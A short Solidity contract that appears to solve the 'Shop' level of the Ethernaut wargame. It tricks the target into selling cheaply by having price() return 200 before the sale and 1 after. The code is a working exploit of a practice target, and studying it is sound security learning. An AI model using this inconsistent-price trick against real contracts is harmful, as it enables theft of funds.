// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

interface IShop {
    function isSold() external returns (bool);
    function buy() external;
}

contract Cracked21_Shop {
    address ethernaut_contracts;

    constructor(address _address) {
        ethernaut_contracts = _address;
    }

    function price() public returns (uint256) {
        if (IShop(ethernaut_contracts).isSold()) {
            return 1;
        } else return 200;
    }

    function buy() public {
        IShop(ethernaut_contracts).buy();
    }
}
